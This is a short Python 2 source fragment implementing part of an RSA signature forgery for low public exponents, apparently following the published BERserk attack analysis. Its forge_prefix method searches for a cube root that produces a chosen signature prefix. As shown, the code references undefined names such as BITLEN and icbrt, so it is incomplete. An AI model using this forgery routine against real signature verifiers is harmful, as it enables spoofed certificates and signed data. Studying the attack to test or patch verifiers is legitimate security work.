import hashlib

class Generator():

    @classmethod
    def digest(cls, message):
        return hashlib.sha256(message).hexdigest()

    @classmethod
    def forge_prefix(cls, s, hashSize, publicKeyModulo):
        """This method has been create with the help of the documentation found here :
        http://www.intelsecurity.com/resources/wp-berserk-analysis-part-1.pdf
        """
        zd = BITLEN - hashSize
        repas = (s << zd)
        repa = (repas >> zd)
        cmax = publicKeyModulo
        ctop = cmax
        cmin = 0
        s = 0
        while True:
            c = (cmax + cmin + 1)/2
            a1 = repas + c
            s = icbrt(a1, BITLEN)
            a2 = ((s * s * s) >> zd)
            if a2 == repa:
                break
            if c == cmax or c == cmin:
                print " *** Error: The value cannot be found ***"
                return 0
            if a2 > repa:
                cmax = c
            else:
                cmin = c
        for d in range(zd/3, 0, -1):
            mask = ((1 << d) - 1)
            s1 = s & (~mask)
            a2 = ((s1 * s1 * s1) >> zd)
            if a2 == repa:
                return s1
        return s
